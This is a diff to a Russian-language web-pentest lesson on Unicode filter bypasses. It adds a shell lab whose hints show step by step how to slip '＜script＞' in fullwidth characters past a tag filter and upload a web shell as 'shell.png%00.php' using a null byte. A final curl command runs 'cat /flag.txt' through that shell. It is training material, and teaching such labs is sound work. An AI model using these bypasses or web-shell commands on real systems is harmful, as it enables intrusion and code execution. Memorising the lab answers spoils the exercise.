@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 34
 summary: "Обход фильтров через Unicode: NFKC-нормализация, homoglyph, переопределение пути, null byte и overlong-кодирование."
+lab:
+  kind: shell
+  title: "Практика: Unicode и null byte"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Фильтр ищет байты `<script>` — подставь полноширинные `＜script＞`: после NFKC это снова тег."
+    - "Загрузка проверяет расширение по строке — обрывай её null byte (`%00`)."
+    - "Залей шелл как `shell.png%00.php`: фильтр увидит `.png`, а ФС сохранит `.php`."
+    - "Выполни: `curl -s 'https://comment.local/uploads/shell.php?c=cat /flag.txt' | grep nto > found.txt`, затем `check`."
 ---
 
 ## Вопрос, с которого всё начинается
